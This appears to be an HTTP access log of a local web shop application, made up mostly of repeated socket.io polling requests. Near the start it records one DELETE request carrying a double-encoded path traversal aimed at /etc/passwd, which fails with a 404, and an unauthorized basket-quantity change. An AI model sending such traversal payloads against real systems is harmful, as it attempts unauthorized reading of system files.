+f1eb98698c0f54ad24019bb3,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWH8Ep&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:43:19+0530
+14d88b4a769f72e2f852db77,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWHDW_&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:43:19+0530
+34e9788733f09f21a7fc45ce,5cf4c280d3fe0cba,31,127.0.0.1,PUT,/api/BasketItems/437,HTTP/1.1,{\x22quantity\x22: 0},401,2025-12-02T23:43:20+0530
+791d1133b3c03a60a3f98eed,ff15b6454ed4c3b8,35,127.0.0.1,DELETE,/api/Products/..%252F..%252F..%252Fetc%252Fpasswd,HTTP/1.1,,404,2025-12-02T23:43:21+0530
+7aea3736a9a439b6cfe7a7e2,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWHDX0&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:43:44+0530
+325d5463af0a1f073ca83370,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWHJe4&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:43:44+0530
+20018dcf2595a4710dd158ef,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWHJe6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:44:09+0530
+f0a082e68d2e78c8529879ee,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWHPlE&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:44:09+0530
+bce0354c0eb6c2dc1eb66a57,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWHPlF&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:44:34+0530
+90c49fa2c1bcc1c8145199d1,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWHVrr&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:44:34+0530
+a0660ec19bf83589e1644959,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWHVrt&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:44:59+0530
+6be8af6af722f02d57184a7f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWHbz3&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:44:59+0530
+b8dbc9aef1e788507f1a514c,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWHbz5&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:45:24+0530
+a17680bd9ce3a2cae8e360ea,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWHi3o&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:45:24+0530
+f068287d4f3cf957706a4a26,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWHi3q&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:45:49+0530
+22b71760aeba144a7c00da4f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWHoAl&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:45:49+0530
+97acfe641b28691034dff1d0,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWHoAq&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:46:14+0530
+0f92c7df75435282ebc383f1,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWHuHD&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:46:14+0530
+4cc0347be4f6dc0f04f9c5c5,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWHuHQ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:46:39+0530
+a23956a75160bf784f2f149f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH-O4&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:46:39+0530
+03017bee3742ad69379de500,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWH-O7&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:47:04+0530
+68faed876f390f4ff823ff1f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWI4UT&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:47:04+0530
+8c48eaa469b0f205080122ff,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWI4UW&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:47:29+0530
+d12979f47a8a15574bfd5172,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWIAay&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:47:29+0530
+8b6fd43e4e96bd9edd25b50a,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWIAa-&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:47:54+0530
+fa56ce6f964b5200e27361c4,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWIGhV&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:47:54+0530
+2f93c5a58a417ae635b5bafe,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWIGhp&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:48:19+0530
+073142285a24732863945857,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWIMoP&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:48:19+0530
+dfb21b2e9c07ce090e2eca2b,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWIMoR&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:48:44+0530
+4afe234c28a9abe2d9fe8441,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWISvF&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:48:44+0530
+72a0cbc2b54882e3caa072fa,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWISvG&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:49:09+0530
+f3d1103a2f9ab2c0f084dfdb,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWIY_d&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:49:09+0530
+cc82e7ee824967eb09cd4077,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWIY_f&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:49:34+0530
+241ab147360da3e77e684003,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWIf6I&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:49:34+0530
+07858a3b465171d7ef0d70ef,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWIf6J&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:49:59+0530
+b4e1ef438c0a3698d50a645e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWIlDU&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:50:00+0530
+e300c9150a4d8557d57e83aa,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWIlDV&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:50:25+0530
+e00070aeffaeb04c7e901a8e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWIrPn&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:50:25+0530
+e1a98e373df4af7e4c9c284f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWIrPp&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:50:50+0530
+d7cbffab4007aa665fe6468b,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWIxYO&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:50:50+0530
+c49b176b7a77bede0876e99a,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWIxYR&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:51:15+0530
+69bdbb77d5753f40a1698d2a,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJ1f6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:51:15+0530
+70557efc7c75c4fd6b0c7202,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJ1f7&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:51:40+0530
+ceab5e5cbfc5710ac87a2513,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJ7lS&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:51:40+0530
+136d1038a8cd3382e3bd471d,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJ7ly&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:52:05+0530
+21280e5afd2cdb47d7badb47,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJDry&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:52:05+0530
+bacf53fd64d768f2842361f4,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJDr-&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:52:30+0530
+a49fb2513bc24141a58b87df,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJJzg&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:52:30+0530
+a86490dcc59121ee5f99783f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJJzh&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:52:55+0530
+fd8d26cd5194a98bb429e5b5,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJQ4N&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:52:55+0530
+ad167bdb35a6f59a86ce9b8b,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJQ4O&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:53:20+0530
+9d951bf38e92cf5deac13f8c,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJWB7&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:53:20+0530
+93b1b918ab008338d116fd6f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJWBe&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:53:45+0530
+f39854ad78e9b16f7e96833d,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJcID&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:53:45+0530
+da8be450b821eb897a9b8c3d,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJcIG&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:54:10+0530
+77dd47f13f42533d1bc63c3d,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJiPH&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:54:10+0530
+5a66a8eb301076695b5ab952,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJiPJ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:54:35+0530
+da54606d7e7799368423b31e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJoVx&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:54:35+0530
+0fd6aedb6aa6d51ed5551607,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJoVy&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:55:00+0530
+941b58e9ffd3beedb6bf7776,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJucV&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:55:00+0530
+4da675ac10f159bf08eadbae,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJucY&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:55:25+0530
+3fb81b0dd3e660aa721cbd38,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWJ-jB&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:55:25+0530
+2bb1676a9bab47e8b43358af,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWJ-jF&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:55:50+0530
+98b1e9afcebad9320e80a397,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWK4qy&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:55:50+0530
+c257854b58fbbaffe8f621c6,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWK4q-&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:56:15+0530
+42d9de27716d0338ce9124f4,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWKAyH&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:56:15+0530
+009e5b2875dd74a11b73285c,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWKAyJ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:56:40+0530
+099467d1c3cac3ee2f8ec1a6,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWKH2q&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:56:40+0530
+ff12c6c91d860d58c656e678,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWKH2t&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:57:05+0530
+7574555dda1b99f964315609,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWKN9c&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:57:05+0530
+193ee79753c7f31b578e9a86,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWKN9d&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:57:30+0530
+11d70e313fc243dc7c6fe2f8,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWKTGW&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:57:30+0530
+f13f3b5ef181c4eeeede7aa3,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWKTGX&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:57:55+0530
+2b66255394234ba8fe7cbc91,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWKZN0&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:57:55+0530
+02275ae832887e738b4a5547,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWKZNL&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:58:20+0530
+ade3b3e5363789cbce3aa4b3,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWKfUI&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:58:20+0530
+5e34a5d20682a1c6419df01b,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWKfUJ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:58:45+0530
+be3820ce18c8b38e5b9c2be2,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWKlap&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:58:45+0530
+9e773e330f21320dc4e3727d,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWKlaw&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:59:10+0530
+4f535ed0481f27ae0c77292a,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWKrhI&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:59:10+0530
+afa7c709840e937d36858e75,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWKrhK&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:59:35+0530
+52308ec10f42399322fd4112,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWKxrq&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:59:35+0530
+d66f14c610891b9ad9620265,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWKxru&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:00:00+0530
+9cde2bac5687bd6eb83d5921,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWL1zr&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:00:00+0530
+510569c5e51f854bf39a38fe,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWL1zt&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:00:25+0530
+82f6c58718cc5c49bf2e0bcf,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWL84N&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:00:25+0530
+70f02c00eaf4ec0bda5d47f2,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWL84R&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:00:50+0530
+e3871142a1e9501b5f0e7878,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWLEEm&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:00:51+0530
+f2cb2dca1de99e211ff39e6f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWLEEr&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:01:16+0530
+8c8e87495c71fa5cad2a4482,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWLKN1&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:01:16+0530
+f4e7bb5b6ff016454827feb9,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWLKNZ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:01:41+0530
+a127d5c78fa39f9ce9eecced,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWLQUZ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:01:41+0530
+b6602c4db1d22b171d1c4e66,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWLQUf&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:02:06+0530
+8a632587d813a24495691f3d,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWLWcK&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:02:06+0530
+e283ce9d06b63f3a8c7c3300,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWLWcM&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:02:31+0530
+cea9c4b2742c69e44fb5ae8c,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWLcl6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:02:31+0530
+64e58759c3ab343ade14e97e,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWLclK&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:02:56+0530
+ee80e3fa84bb2f4a9d0c94ce,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWLis9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:02:56+0530
+93189a899792aa7c1b6c4ac9,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWLisC&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:03:22+0530
+515c0582f9c11be1e0b01059,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWLpEq&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:03:22+0530
+7a0b368ee8c7a54414a32e99,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWLpEs&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:03:47+0530
+c4eefbabc6e2fff9563bc435,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWLvLt&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:03:47+0530
+0fb735998f8ef0fe56caf2b7,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWLvLw&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:04:12+0530
+2e5aefe3ee9ed539a0902169,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWL_SE&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:04:12+0530
+7aee026039bf560ec1c650d2,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWL_SF&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:04:37+0530
+bb35d5a7a05d42da6ebc23ce,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWM5Zq&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:04:37+0530
+e75f64ea33e83e7e45123e39,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWM5a8&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:05:02+0530
+bb72d040067d64a99c9bec8c,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMBgu&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:05:03+0530
+ea1f4c56df01eeaeba9781f3,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMBgw&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:05:28+0530
+f4d4cb328f09b93b3a57c1d0,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMHtc&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:05:28+0530
+25cc62817780297000b876f8,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMHtq&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:05:53+0530
+34c6ad0aeb487fcb14557acc,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMO4x&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:05:53+0530
+2c0ec99444f52a6135be69a8,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMO5Z&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:06:18+0530
+fa3caff74eb3d57bad05ebb3,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMUC5&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:06:18+0530
+9cfdc7cdf26cd5e43f1d375b,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMUCU&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:06:43+0530
+5483db5467909ec26a0920a7,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMaJG&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:06:43+0530
+e45e9eabe3d5fedb990ec95c,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMaJK&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:07:08+0530
+adb40b22cd66ee48412f8e2a,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMgQD&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:07:08+0530
+55fe364a3671b5067d84b59f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMgS7&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:07:33+0530
+7987e111b605d639720a2814,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMmWo&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:07:33+0530
+9ebc1d6b69f62ea5b1602ad6,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMmWq&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:07:58+0530
+af6f750512ba6e66cd8f1457,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMsdc&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:07:58+0530
